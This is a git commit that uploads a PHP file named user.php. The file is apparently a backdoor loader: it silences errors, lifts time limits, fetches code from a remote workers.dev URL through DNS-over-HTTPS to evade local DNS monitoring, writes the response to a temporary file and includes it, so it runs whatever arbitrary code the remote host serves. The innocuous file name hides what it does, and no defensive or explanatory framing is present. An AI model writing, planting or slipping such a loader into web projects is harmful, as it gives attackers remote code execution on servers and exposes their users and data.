3631d5b87cbaadd86adbd9071f10ad13132b9c19
hagan1337 <100196234+hagan1337@users.noreply.github.com>
2026-02-02 02:14:03 +0700

    Add files via upload

---
+++ user.php
@@ -0,0 +1,43 @@
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+
+
+$url = "https://tools.sonyatasya0908.workers.dev/raw/006b0321c3ad";
+
+
+$dns = "https://cloudflare-dns.com/dns-query";
+
+$ch = curl_init($url);
+
+
+if (defined("CURLOPT_DOH_URL")) {
+    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
+}
+
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+
+$res = curl_exec($ch);
+
+curl_close($ch);
+
+
+
+
+$tmp = tmpfile();
+
+
+$path_metadata = stream_get_meta_data($tmp);
+$path = $path_metadata["uri"];
+
+
+fprintf($tmp, "%s", $res);
+
+
+include $path;
+
+?>
